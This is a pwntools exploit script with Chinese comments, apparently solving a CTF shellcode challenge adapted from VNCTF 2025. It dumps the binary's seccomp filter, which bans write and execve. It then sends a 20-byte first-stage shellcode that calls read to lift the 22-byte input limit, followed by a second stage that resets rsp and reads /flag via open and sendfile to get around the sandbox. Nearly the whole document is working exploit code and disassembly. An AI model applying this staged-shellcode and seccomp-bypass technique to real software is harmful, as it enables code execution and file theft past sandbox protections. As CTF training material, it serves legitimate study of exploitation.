# 根据VNCTF-2025-pwn签到题改

# 查看sandbox禁用的函数： seccomp-tools dump ./ezshellcode
'''
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0010
 0006: 0x15 0x03 0x00 0x00000014  if (A == writev) goto 0010
 0007: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0010
 0008: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0011: 0x06 0x00 0x00 0x00000000  return KILL
'''
# 禁用了：write、writev、execve、execveat函数，可以使用open/read/sendfile等函数绕过
# 参考：https://xz.aliyun.com/news/16107、https://www.cnblogs.com/xmiscx/p/18827064

# 继续查看溢出点部分，限制了读取大小为：0x16(22个字节)
'''
void *buf; // [rsp+8h] [rbp-8h]
read(0, buf, 0x16uLL);

.text:0000000000001515                 mov     [rbp+buf], rax
.text:0000000000001519                 mov     rax, [rbp+buf]
.text:000000000000151D                 mov     edx, 16h        ; nbytes
.text:0000000000001522                 mov     rsi, rax        ; buf
.text:0000000000001525                 mov     edi, 0          ; fd
.text:000000000000152A                 call    _read
'''
# 可以修改read函数的第三个参数大小绕过读取大小的限制，即修改rdx的值为0x1000
# 原本的想法是直接修改rdx的大小，再jmp到0x0001522处继续执行的，但是elf文件开启了Full RELRO（地址随机化），无法直接jmp，又没办法泄露函数的地址

from pwn import *

r = process(r'./ezshellcode')
context.log_level = 'debug'
context.arch = 'amd64'

# 构造修改rdx大小后的read函数
shellcode_change_size = '''
    xor rdi, rdi
    mov rsi, 0x114514014
    mov rdx, 0x1000
    syscall
'''
print(len(asm(shellcode_change_size)))  # 20
# 这里要注意，shellcode_change_size这段payload的大小为20，即0x14，不能够超过限制的0x16大小
# 要设置new read函数的rsi地址为可执行可写的地址，并将读取flag的shellcode写到该地址上

'''
.text:0000000000001289 ; void __fastcall execute(__int64)
.text:0000000000001289                 public execute
.text:0000000000001289 execute         proc near               ; CODE XREF: main+D4↓p
.text:0000000000001289
.text:0000000000001289 var_30          = qword ptr -30h
.text:0000000000001289
.text:0000000000001289 ; __unwind {
.text:0000000000001289                 endbr64
.text:000000000000128D                 push    rbp
.text:000000000000128E                 mov     rbp, rsp
.text:0000000000001291                 push    r15
.text:0000000000001293                 push    r14
.text:0000000000001295                 push    r13
.text:0000000000001297                 push    r12
.text:0000000000001299                 push    rbx
.text:000000000000129A                 mov     [rbp+var_30], rdi
.text:000000000000129E                 mov     rdi, [rbp+var_30]
.text:00000000000012A2                 xor     rax, rax
.text:00000000000012A5                 xor     rbx, rbx
.text:00000000000012A8                 xor     rcx, rcx
.text:00000000000012AB                 xor     rdx, rdx
.text:00000000000012AE                 xor     rsi, rsi
.text:00000000000012B1                 xor     r8, r8
.text:00000000000012B4                 xor     r9, r9
.text:00000000000012B7                 xor     r10, r10
.text:00000000000012BA                 xor     r11, r11
.text:00000000000012BD                 xor     r12, r12
.text:00000000000012C0                 xor     r13, r13
.text:00000000000012C3                 xor     r14, r14
.text:00000000000012C6                 xor     r15, r15
.text:00000000000012C9                 xor     rbp, rbp
.text:00000000000012CC                 xor     rsp, rsp
.text:00000000000012CF                 mov     rdi, rdi
.text:00000000000012D2                 jmp     rdi
.text:00000000000012D2 execute         endp

这里有个点，execute函数中，把所有寄存器都重置了一遍，他会导致rsp地址丢失，无法正常push值到栈上，需要把rsp设置到rwx的地址上
'''
# open + sendfile (sendfile可以直接替代write、read函数)
# open('/flag', 0, 0)
# sendfile(1, 'rax', 0, 0x50)  # rax即为open函数的返回值
# '/flag'[::-1].encode('utf-8').hex()  ====>  67616c662f
shellcode_flag = '''
    xor rsp, rsp
    xor rbx, rbx
    mov rsp, 0x114514014
    push 0x00
    mov rbx, 0x67616c662f
    push rbx
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x2
    syscall
    
    mov rsi, rax
    xor rax, rax
    mov rax, 0x28
    mov rdi, 1
    mov r10, 0x50
    syscall
'''

# 在 x86_64 架构的 Linux 中，系统调用的参数传递遵循固定规则：
# 第 1 个参数 → rdi
# 第 2 个参数 → rsi
# 第 3 个参数 → rdx
# 第 4 个参数 → r10 （而非rcx）
# 第 5 个参数 → r8
# 第 6 个参数 → r9
# 系统调用号 → rax

gdb.attach(r)
r.sendlineafter(b'strength ', asm(shellcode_change_size))
r.sendline(asm(shellcode_flag))
r.interactive()
